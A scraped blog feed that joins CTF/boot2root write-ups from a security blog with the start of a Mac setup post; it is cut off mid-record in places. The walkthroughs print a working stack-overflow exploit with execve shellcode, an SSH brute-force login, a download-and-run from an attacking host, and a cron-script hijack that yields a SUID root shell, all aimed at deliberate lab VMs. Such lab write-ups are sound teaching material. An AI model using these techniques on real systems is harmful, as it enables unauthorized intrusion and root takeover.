__init_array_start\n0017630 _GLOBAL_OFFSET_TABLE_\n0017656 __libc_csu_fini\n0017676 __i686.get_pc_thunk.bx\n0017725 data_start\n0017740 <span class=\"nb\">printf</span>@@GLIBC_2.0\n0017762 _edata\n0017771 _fini\n0017777 strcpy@@GLIBC_2.0\n0020021 __DTOR_END__\n0020036 __data_start\n0020053 __gmon_start__\n0020072 <span class=\"nb\">exit</span>@@GLIBC_2.0\n0020112 __dso_handle\n0020127 _IO_stdin_used\n0020146 __libc_start_main@@GLIBC_2.0\n0020203 __libc_csu_init</code></pre> \n</figure> \n<p>bof.c - pretty good indication that Buffer Overflow was the next logical step (unless it’s more tr0ling).</p> \n<p>##Exploit Development</p> \n<p>###Fuzzing</p> \n<p>I started by fuzzing with 300 A’s:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">fuzzing linux binary</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">./r00t $(python -c 'print \"A\" *300')</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Segmentation fault<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Bangin’ then I tried 250 no crash, adding 10 each time then subtracting when the seg fault occoured at 268 and the instruction pointer address at 269 <code>Illegal instruction</code>.</p> \n<p>Using gdb I located the address of ESP.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">(</span>gdb<span class=\"o\">)</span> i r esp\nesp            0xbffffb80 0xbffffb80</code></pre> \n</figure> \n<p>Padded with some NOPs - for a reliable landing.</p> \n<p><img src=\"https://highon.coffee/img/warf-jump.gif\" alt=\"Worf jump\" /></p> \n<p>Overwrote EIP with the location of ESP and tagged some shellcode on the end to exectute a shell.</p> \n<p>###Final Exploit</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">./r00t <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s1\">'print \"A\"*268 + \"\\x80\\xfb\\xff\\xbf\" + \"\\x90\" * 10 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"'</span><span class=\"si\">)</span></code></pre> \n</figure> \n<p>Note: gdb drops privileges on SUID, in order to spawn the new shell with SUID you need to execute the exploit outside of gdb, or the shell will spawn as the unprivileged user.</p> \n<p>The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the vulnerable binary.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Exploit Process</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">du -sh *<br /></span> </p> \n   <p class=\"line\"> <span class=\"output\">12K door1<br /></span> </p> \n   <p class=\"line\"> <span class=\"output\">12K door2<br /></span> </p> \n   <p class=\"line\"> <span class=\"output\">16K door3<br /></span> </p> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">cd door3<br /></span> </p> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">./r00t $(python -c 'print \"A\"*268 + \"\\x80\\xfb\\xff\\xbf\" + \"\\x90\" * <br />10 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\<br />xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"')</span> </p> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">whoami<br /></span> <span class=\"output\">root<br /></span> <span class=\"output\"><br /></span> </p> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">cat /root/Proof.txt<br /></span> <span class=\"output\">You win this time young Jedi...</span> <span class=\"output\"><br /></span> <span class=\"output\">a70354f0258dcc00292c72aab3c8b1e4<br /></span> </p> \n  </div> \n </div> \n</section> \n<p>##Root dance</p> \n<p><img src=\"https://highon.coffee/img/girl-dancing-excited.gif\" alt=\"Root Dance\" /></p> \n<p>##Thanks</p> \n<p>Thanks to <a 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Tr0ll 1 Walkthrough","link":"https://highon.coffee/blog/tr0ll-1-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/tr0ll-1-walkthrough/#remote-exploit\" id=\"markdown-toc-remote-exploit\">Remote Exploit</a></li> \n <li><a href=\"https://highon.coffee/blog/tr0ll-1-walkthrough/#local-enumeration\" id=\"markdown-toc-local-enumeration\">Local Enumeration</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/tr0ll-1-walkthrough/#weak-filesystem-permissions\" id=\"markdown-toc-weak-filesystem-permissions\">Weak Filesystem Permissions</a></li> \n   <li><a href=\"https://highon.coffee/blog/tr0ll-1-walkthrough/#enumeration-findings\" id=\"markdown-toc-enumeration-findings\">Enumeration Findings</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/tr0ll-1-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/tr0ll-1-walkthrough/#got-root\" id=\"markdown-toc-got-root\">Got Root</a></li> \n  </ul> </li> \n</ul> \n<p>I thought I’d have a go at a Boot2Root over Christmas, looking through the VM’s I came accross <a href=\"https://www.vulnhub.com/entry/tr0ll-1,100/\">Tr0ll: 1</a> the description caught my attention:</p> \n<p> <i>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</i> <i>The goal is simple, gain root and get Proof.txt from the /root directory.</i> <i>Not for the easily frustrated! Fair warning, there be trolls ahead!</i> <i>Difficulty: Beginner ; Type: boot2root</i> </p> \n<p>I downloaded the VM, span it up in VMWare and got cracking.</p> \n<p>##Enumeration</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">nmap -p 1-65535 -sV -sS -A -T4 192.168.78.140</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap -p 1-65535 -sV -sS -A -T4 192.168.78.140</span> </p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-24 18:26 GMT<br /></span> \n   <span class=\"output\">Nmap scan report for 192.168.78.140<br /></span> \n   <span class=\"output\">Host is up (0.00035s latency).<br /></span> \n   <span class=\"output\">Not shown: 65532 closed ports<br /></span> \n   <span class=\"output\">PORT STATE SERVICE VERSION <br /></span> \n   <span class=\"output\">21/tcp open ftp vsftpd 3.0.2<br /></span> \n   <span class=\"output\">| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br /></span> \n   <span class=\"output\">|_-rwxrwxrwx 1 1000 0 8068 Aug 09 23:43 lol.pcap [NSE: writeable]<br /></span> \n   <span class=\"output\">22/tcp open ssh (protocol 2.0)<br /></span> \n   <span class=\"output\">| ssh-hostkey: <br /></span> \n   <span class=\"output\">| 1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)<br /></span> \n   <span class=\"output\">| 2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)<br /></span> \n   <span class=\"output\">|_ 256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)<br /></span> \n   <span class=\"output\">80/tcp open http Apache httpd 2.4.7 ((Ubuntu))<br /></span> \n   <span class=\"output\">| http-robots.txt: 1 disallowed entry <br /></span> \n   <span class=\"output\">|_/secret<br /></span> \n   <span class=\"output\">|_http-title: Site doesn't have a title (text/html).<br /></span> \n   <span class=\"output\">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :<br /></span> \n   <span class=\"output\">SF-Port22-TCP:V=6.47%I=7%D=12/24%Time=549B054B%P=x86_64-unknown-linux-gnu%<br /></span> \n   <span class=\"output\">SF:r(NULL,29,\"SSH-2\\.0-OpenSSH_6\\.6\\.1p1\\x20Ubuntu-2ubuntu2\\r\\n\");<br /></span> \n   <span class=\"output\">MAC Address: 00:0C:29:D9:C1:FE (VMware)<br /></span> \n   <span class=\"output\">Device type: general purpose<br /></span> \n   <span class=\"output\">Running: Linux 3.X<br /></span> \n   <span class=\"output\">OS CPE: cpe:/o:linux:linux_kernel:3<br /></span> \n   <span class=\"output\">OS details: Linux 3.11 - 3.14<br /></span> \n   <span class=\"output\">Network Distance: 1 hop<br /></span> \n   <span class=\"output\">Service Info: OS: Unix<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">TRACEROUTE<br /></span> \n   <span class=\"output\">HOP RTT ADDRESS<br /></span> \n   <span class=\"output\">1 0.35 ms 192.168.78.140<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .<br /></span> \n   <span class=\"output\">Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>###Service Enumeration</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 21</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>FTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>vsftpd 3.0.2</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>protocol 2.0</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.4.7 ((Ubuntu))</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>###FTP Enumeration</p> \n<p>Nmap discovered anonymous FTP was exposed on the target, I downloaded lol.pcap from ftp root:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">ftp lol.pcap from target</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">ftp 192.168.78.140</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Connected to 192.168.78.140<br /></span> \n   <span class=\"output\">220 (vsFTPd 3.0.2)<br /></span> \n   <span class=\"output\">Name (192.168.78.140:root): anonymous<br /></span> \n   <span class=\"output\">331 Please specify the password.<br /></span> \n   <span class=\"output\">Password:<br /></span> \n   <span class=\"output\">230 Login successful.<br /></span> \n   <span class=\"output\">Remote system type is UNIX.<br /></span> \n   <span class=\"output\">Using binary mode to transfer files.<br /></span> \n   <span class=\"output\">ftp&gt; get lol.pcap<br /></span> \n   <span class=\"output\">local: lol.pcap remote: lol.pcap<br /></span> \n   <span class=\"output\">200 PORT command successful. Consider using PASV.<br /></span> \n   <span class=\"output\">150 Opening BINARY mode data connection for lol.pcap (8068 bytes).<br /></span> \n   <span class=\"output\">226 Transfer complete.<br /></span> \n   <span class=\"output\">80/tcp open http Apache httpd 2.4.7 ((Ubuntu))<br /></span> \n   <span class=\"output\">8068 bytes received in 0.00 secs (1614.9 kB/s)<br /></span> \n   <span class=\"output\">ftp&gt; exit<br /></span> \n   <span class=\"output\">221 Goodbye.<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Examined the contents of lol.pcap in Wireshark, discovering the following message:</p> \n<p><img src=\"https://highon.coffee/img/blog/tr0ll-lol.pcap.png\" alt=\"tr0ll lol.pcap\" /></p> \n<p>For clarity the message read:</p> \n<p><i>FTP Data (Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P Sucks, you were so close… gotta TRY HARDER!</i></p> \n<p>Checking for exposed serives in the previous Nmap scan we can see FTP, SSH and HTTP are exposed.</p> \n<p>A quick attempt at logging in over SSH with root with the password “sup3rs3cr3tdirlol” - resulted in a fail (as expected).</p> \n<p>Onto the next service in the list.</p> \n<p>###HTTP Enumeration</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">nmap --script=http-enum -p80 -n 192.168.78.140</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap --script=http-enum -p80 -n 192.168.78.140</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-24 18:40 GMT<br /></span> \n   <span class=\"output\">Nmap scan report for 192.168.78.140<br /></span> \n   <span class=\"output\">Host is up (0.00046s latency).<br /></span> \n   <span class=\"output\">PORT STATE SERVICE<br /></span> \n   <span class=\"output\">80/tcp open http<br /></span> \n   <span class=\"output\">| http-enum:<br /></span> \n   <span class=\"output\">| /robots.txt: Robots file<br /></span> \n   <span class=\"output\">|_ /secret/: Potentially interesting folder<br /></span> \n   <span class=\"output\">MAC Address: 00:0C:29:D9:C1:FE (VMware)<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Entering /secret/ url in the browser rendered:</p> \n<p><img src=\"https://highon.coffee/img/blog/u-mad-bro-tr0ll.png\" alt=\"tr0ll U MAD BRO\" /></p> \n<p>Nothing exciting was in the page source…</p> \n<p>I took a guess and entered sup3rs3cr3tdirlol as a dir:</p> \n<p><img src=\"https://highon.coffee/img/blog/sup3rs3cr3tdirlol.png\" alt=\"tr0ll sup3rs3cr3tdirlol\" /></p> \n<p>Lucked in! But it didn’t contain this:</p> \n<p><img src=\"https://highon.coffee/img/kirk-rofl.gif\" alt=\"tr0ll Pass.txt\" /></p> \n<p>strings output for “roflmao”:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">strings ~/Downloads/roflmao</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">strings ~/Downloads/roflmao</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">lib/ld-linux.so.2<br /></span> \n   <span class=\"output\">libc.so.6<br /></span> \n   <span class=\"output\">_IO_stdin_used<br /></span> \n   <span class=\"output\">printf<br /></span> \n   <span class=\"output\">__libc_start_main<br /></span> \n   <span class=\"output\">__gmon_start__<br /></span> \n   <span class=\"output\">GLIBC_2.0<br /></span> \n   <span class=\"output\">PTRh<br /></span> \n   <span class=\"output\">[^_]<br /></span> \n   <span class=\"output\">Find address 0x0856BF to proceed<br /></span> \n   <span class=\"output\">;*2$\"<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>The binary appeared to just print “0x0856BF”, I entered this in the browser again - not expecting it to work.</p> \n<p><img src=\"https://highon.coffee/img/blog/which_one_lol.txt.png\" alt=\"tr0ll which on lol\" /></p> \n<p>I lucked in again!</p> \n<p>Another dir contained:</p> \n<p><img src=\"https://highon.coffee/img/blog/pass.txt.png\" alt=\"tr0ll Pass.txt\" /></p> \n<p>Containing:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Good_job_:<span class=\"o\">)</span></code></pre> \n</figure> \n<p>##SSH Brute Force</p> \n<p>I manually attempted a SSH brute force using the previously discovered usernames + password from Pass.txt. After several attempts the connection was refused via SSH, rebooting the target VM did not help - I suspected iptables, fail2ban / DenyHosts.</p> \n<p>Changing the attacking machines IP address allowed me to reconnect, none of the usernames authenticated with the password in Pass.txt.</p> \n<p><img src=\"https://highon.coffee/img/picard-puff.gif\" alt=\"Picard Puff\" /></p> \n<p>Not sure what to do next, I tried the file name as the password against the previous list (annoyingly I had to change the target machines IP address again to complete).</p> \n<h3 id=\"remote-exploit\">Remote Exploit</h3> \n<p>Success, I managed to authenticate using:</p> \n<div class=\"mobile-side-scroller\" style=\"width:50%;\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>overflow</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Pass.txt</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">ssh overflow@192.168.78.140</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">ssh overflow@192.168.78.140</span></p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">* Documentation: https://help.ubuntu.com/<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.<br /></span> \n   <span class=\"output\">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Last login: Wed Dec 24 12:00:52 2014 from 192.168.78.128<br /></span> \n   <span class=\"output\">Could not chdir to home directory /home/overflow: No such file or directory<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">$ id<br /></span> \n   <span class=\"output\">uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Then almost as soon as I’d logged in, the following message printed to console and the session closed:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Broadcast Message from root@trol</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"output\"><br /></span> <span class=\"output\">Broadcast Message from root@trol<br /></span> <span class=\"output\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(somewhere) at 22:00 ... <br /></span> <span class=\"output\"><br /></span> </p> \n   <p class=\"line\"> <span class=\"output\">TIMES UP LOL!<br /></span> </p> \n  </div> \n </div> \n</section> \n<p>This became rather annoying…</p> \n<p><img src=\"https://highon.coffee/img/janeway-annoyed.gif\" alt=\"Janeway Annoyed\" /></p> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>I copied over my local enumeration sctipt to /var/tmp/ which discovered the following world writable files:</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Local Enumeration Sctipt</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">wget http://attacking-machine/exploits/enumeration/lin/linux-local-enum.sh -P /var/tmp/ &amp;&amp; chmod 700 /var/tmp/linux-local-enum.sh &amp;&amp; ./var/tmp/linux-local-enum.sh<br /></span> </p> \n  </div> \n </div> \n</section> \n<h3 id=\"weak-filesystem-permissions\">Weak Filesystem Permissions</h3> \n<p>The enumeration script identified the following world writable files:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\">#########################################</span>\n<span class=\"c\">## 777 Files                           ##</span>\n<span class=\"c\">#########################################</span>\n\n/srv/ftp/lol.pcap\n/var/tmp/cleaner.py.swp\n/var/www/html/sup3rs3cr3tdirlol/roflmao\n/var/log/cronlog\n/lib/log/cleaner.py</code></pre> \n</figure> \n<h3 id=\"enumeration-findings\">Enumeration Findings</h3> \n<p>/lib/log/cleaner.py was owned by root and executed by cron to clean out /tmp</p> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<p>From the attacking machine I downloaded an suid bin (spawns a shell) to /usr/bin/suid on the target.</p> \n<p>Exploiting the poor filesystem permissions, I swapped out the contents of /lib/log/cleaner.py for:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"c1\">#!/usr/bin/env python\n</span><span class=\"kn\">import</span> <span class=\"nn\">os</span>\n<span class=\"kn\">import</span> <span class=\"nn\">sys</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">system</span><span class=\"p\">(</span><span class=\"s\">'chown root:root /var/tmp/suid; chmod 4777 /var/tmp/suid'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"nb\">exit</span><span class=\"p\">()</span></code></pre> \n</figure> \n<h3 id=\"got-root\">Got Root</h3> \n<p>Went to get a coffee, came back and reconnected after the annoying message.</p> \n<p>Executed my suid binary, got root.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Local Privilege Escalation</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">/var/tmp/suid<br /></span> </p> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">cat /root/proof.txt<br /></span> <br /> <span class=\"output\">Good job, you did it!<br /></span> <br /> <span class=\"output\">702a8c18d29c6f3ca0d99ef5712bfbdc<br /></span> </p> \n   <br /> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">id<br /></span> <br /> <span class=\"output\">uid=0(root) gid=0(root) groups=0(root),1002(overflow)<br /></span> </p> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">whoami<br /></span> <br /> <span class=\"output\">root<br /></span> </p> \n  </div> \n </div> \n</section> \n<p>####Root dance…</p> \n<p><img src=\"https://highon.coffee/img/picard-shake-it-so.gif\" alt=\"Picard Dancing\" /></p> \n<p>##Thanks</p> \n<p>Thanks to <a +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/tr0ll-lol.pcap.png","linkMd5":"ce65c3912438c2d897f45e3d84f9d6cd","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn59@2020_2/2020/08/25/01-24-54-418_dbab5d7f19fefccb.webp","destWidth":611,"destHeight":246,"sourceBytes":49234,"destBytes":39826,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/tr0ll-lol.pcap.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn59@2020_2/2020/08/25/01-24-54-418_dbab5d7f19fefccb.webp","https://highon.coffee/img/blog/u-mad-bro-tr0ll.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn79@2020_6/2020/08/25/01-25-16-064_c00ee26914e5e327.webp","https://highon.coffee/img/blog/sup3rs3cr3tdirlol.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn65@2020_6/2020/08/25/01-25-14-559_08fb189338ce4585.webp","https://highon.coffee/img/kirk-rofl.gif":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn20@2020_4/2020/08/25/01-25-16-189_8b7e2d209aa037fa.webp","https://highon.coffee/img/blog/which_one_lol.txt.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn39@2020_2/2020/08/25/01-25-15-832_96b31484fad5bece.webp","https://highon.coffee/img/blog/pass.txt.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn52@2020_1/2020/08/25/01-25-14-385_0a55bd99ca08af03.webp","https://highon.coffee/img/picard-puff.gif":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn60@2020_5/2020/08/25/01-25-15-743_37e5a47d8fcd3ba8.webp","https://highon.coffee/img/janeway-annoyed.gif":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn35@2020_4/2020/08/25/01-25-17-490_1d35440e980f7621.webp","https://highon.coffee/img/picard-shake-it-so.gif":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn56@2020_4/2020/08/25/01-25-16-222_a678f003c55edf1a.webp"},"publishedOrCreatedDate":1598318675555},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"MacBook - Post Install Config + Apps","link":"https://highon.coffee/blog/macbook-post-install-check-list/","description":"<p>Just for fun, here is my list of post install config changes plus list of apps I install after installing <code> Mac OS X </code></p> \n<p>##Side Dock</p> \n<p>Open: <code>System Preferences &gt; Dock</code> click <strong>Left</strong>.</p> \n<p><img src=\"https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-dock-on-left.png\" alt=\"Max OS X Dock Left hand side\" /></p> \n<p>##Enable Right Click MacBook Trackpad</p> \n<p>Open: <code>System Preferences &gt; Trackpad</code> click <strong>click in bottom right corner</strong> under <em>Secondary Click</em>.</p> \n<p><img src=\"https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-enable-right-click-trackpad.png\" alt=\"Max OS X Enable Right Click Trackpad\" /></p> \n<p>##Enable path view in finder</p> \n<p>Open Finder <code>View &gt; Show Path Bar</code></p> \n<p>The path will render at the bottom of the Finder window.</p> \n<p>##Create symlink for /Volumes</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">ln</span> <span class=\"nt\">-s</span> /Volumes/ ~/Desktop/Volumes/</code></pre>\n</figure> \n<p>If I don’t do this, my cifs mounts show as a single drive - if you have none browsable cifs mounts then this can become a pain.</p> \n<p>##Mount smb / cifs share in OSX</p> \n<p>Open Finder, press <code>CMD+k</code> and enter the path of your smb <code>smb://</code> or cifs <code>cifs://</code> server.</p> \n<p><img src=\"https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-mount-cifs-share.png\" alt=\"Max OS X Mount Cifs / SMB Share\" /></p> \n<h2 id=\"finder-show-file-extensions\">Finder show file extensions</h2> \n<p>Show file extensions on Mac OS X, open Finder: <code>Preferences &gt; Advanced</code> tick <strong>Show all filename extensions</strong>, I also untick <strong>Show warnnig before changing an extension</strong></p> \n<p><img src=\"https://highon.coffee/img/blog/macbook-post-install-config-apps/os-x-finder-show-file-extensions.png\" alt=\"Max OS X Show File Extensions in Finder\" /></p> \n<p>##Delete junk from dock</p> \n<p>Delete all unused apps / icons from dock.</p> \n<p>##Increase Terminal Font Size</p> \n<p><code>Terminal &gt; Preferences &gt; Text</code> adjust font size.</p> \n<p>##Install Brew</p> \n<h2 id=\"setup-home-brew\">Setup home brew</h2> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">ruby <span class=\"nt\">-e</span> <span class=\"s2\">\"</span><span class=\"si\">$(</span>curl <span class=\"nt\">-fsSL</span> https://raw.githubusercontent.com/Homebrew/install/master/install<span class=\"si\">)</span><span class=\"s2\">\"</span></code></pre>\n</figure> \n<p>Install command line tools when prompted.</p> \n<h2 id=\"setup-jekyll\">Setup Jekyll</h2> \n<p>###Install RVM</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">gpg <span class=\"nt\">--keyserver</span> hkp://keys.gnupg.net <span class=\"nt\">--recv-keys</span> 409B6B1796C275462A1703113804BB82D39DC0E3\n<span class=\"se\">\\c</span>url <span class=\"nt\">-sSL</span> https://get.rvm.io | bash <span class=\"nt\">-s</span> stable</code></pre>\n</figure> \n<p>###Install Jekyll</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">gem <span class=\"nb\">install </span>jekyll </code></pre>\n</figure> \n<p>###Trouble Shooting Jekyll Install</p> \n<p>you don’t have write permissions for the /library/ruby/gems/2.0.0 directory. mac</p> \n<p>Close and reopen terminal, re-run gem install jekyll - the gems should build fine, <strong>DO NOT USE</strong> sudo.</p> \n<p>cd into your jekyll dir and run “jekyll serve”</p> \n<p>Install the following via brew:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap vim netcat git</code></pre>\n</figure> \n<p>Copy .ssh back over for ssh keys.</p> \n<h2 id=\"install-apps\">Install Apps</h2> \n<p>List of Apps I use.</p> \n<ul> \n <li>Evernote</li> \n <li>Disk Inventory X (for when du -h doesn’t cut it)</li> \n 